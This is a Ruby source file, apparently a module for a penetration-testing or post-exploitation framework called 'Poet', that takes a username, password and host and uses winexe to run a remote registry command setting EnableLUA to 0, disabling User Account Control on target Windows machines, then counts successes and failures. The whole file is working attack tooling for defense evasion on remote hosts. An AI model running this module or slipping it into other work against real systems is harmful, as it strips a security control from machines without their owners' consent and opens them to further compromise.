require 'poet'

class DisableUAC < Poet::Scanner
	self.mod_name = "Disable UAC"
	self.description = "Disable the UAC registry setting on target(s)."
	self.invasive = true
  self.title = 'UAC Confiugration Editor Status'

	def run(username, password, host)
		# call check4uac function to determine uac status
		if check4uac(username, password, host)
			# disable uac
			cmd = "CMD /C reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
			uac = winexe("--uninstall --system //#{host}", cmd)
			if uac =~ /The operation completed successfully/
				print_good("#{host.ljust(15)} - UAC Now Disabled")
				@success = @success + 1
			else
				print_bad("#{host.ljust(15)} - Issues Modifying Registry")
				@failed = @failed + 1
			end
		end
	end

	def finish
		# summary
		puts "\nUAC Disabled: #{@success}"
		puts "UAC Failed: #{@failed}\n\n"

		# Return to menu
		print "Press enter to Return to Enumeration Menu"
		gets
	end
end
